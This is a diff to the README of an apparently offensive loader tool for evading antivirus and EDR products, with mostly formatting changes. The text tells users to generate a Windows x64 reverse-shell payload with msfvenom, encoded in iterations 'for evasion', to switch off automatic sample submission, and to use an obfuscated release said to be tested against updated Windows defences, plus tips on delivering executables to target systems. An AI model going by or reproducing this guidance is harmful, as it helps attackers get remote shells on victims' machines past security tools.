@@ -73,11 +73,12 @@ We suggest to use directly compiled executables as in some situations it depends
 > [!NOTE]
 > ## Sometimes you have to Re-run the program because of Memory Issues. But do not worry, You'll get the shell on Re-run !!!  :nazar_amulet:
 
+
 ### Recommended to Turn-Off "Automatic Sample Submission" If you can or using in the testing environment.
 
 ***1. Generate a .bin file only - You can use C2 servers and metasploit too or any you want***
 
-### Example - msfvenom -p windows/x64/shell_reverse_tcp LHOST=< IP > LPORT=< PORT > -f raw -i < iterations as you want for evasion > -e < encoder you want to use > > shell.bin - **x64-Bit**
+### Example - msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -i <iterations as you want for evasion> -e <encoder you want to use> > shell.bin - **x64-Bit**
   
  **2. Obfuscation is mainly your work to do as per your operation's requirement and the other one's? - WE'LL HANDLE!!!**
   
@@ -92,7 +93,8 @@ level factors. But you can give it a try - In some cases it will work !! :nazar_
 
 ***7. As we know EDR's and AV signatures keep updating, so we created an obfuscated release to assist you and have tested on the Latest Updated Windows . !!!***
 
- ## ⚠️**Keep few things in mind when using obfuscated release -**  
+ > [!IMPORTANT]
+ > ## ⚠️**Keep few things in mind when using obfuscated release -**  
 
  * Never Directly Download Executable via Github on the target system, I found some bytes were missing - Technical Issue  + WindowsSmartScreen even mark genuine executables malicious too while downloading .EXE from Github. ( That's why Non-Malicious like WinPEAs , which is for PrivEsc too faces some windowsSmartScreen blockings ) 
 
